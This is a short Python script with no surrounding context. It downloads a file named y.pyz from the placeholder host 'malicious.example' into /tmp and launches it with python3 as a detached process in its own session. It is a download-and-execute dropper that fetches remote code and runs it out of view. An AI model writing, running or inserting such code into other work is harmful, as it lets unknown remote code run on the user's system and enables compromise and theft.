import urllib.request
import subprocess

urllib.request.urlretrieve("http://malicious.example/y.pyz", "/tmp/y.pyz")
subprocess.Popen(["python3", "/tmp/y.pyz"], start_new_session=True)
